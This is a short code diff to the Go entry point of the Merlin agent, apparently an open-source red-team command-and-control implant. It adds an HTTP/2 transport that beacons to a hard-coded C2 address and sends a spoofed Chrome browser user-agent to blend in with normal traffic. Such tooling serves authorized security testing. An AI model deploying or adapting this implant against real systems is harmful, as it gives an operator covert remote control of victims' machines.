@@ -26,6 +26,7 @@ import (
 
 	// Merlin
 	"github.com/Ne0nd0g/merlin/pkg/agent"
+	"github.com/Ne0nd0g/merlin/pkg/transport/http2"
 )
 
 var url = "https://127.0.0.1:443"
@@ -34,7 +35,8 @@ func main() {}
 
 // run is a private function called by exported functions to instantiate/execute the Agent
 func run(URL string) {
-	a := agent.New("h2", false, false)
+	transport := http2.New("h2", url, "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.85 Safari/537.36")
+	a := agent.New("h2", false, false, transport)
 	a.Run(URL)
 }
 
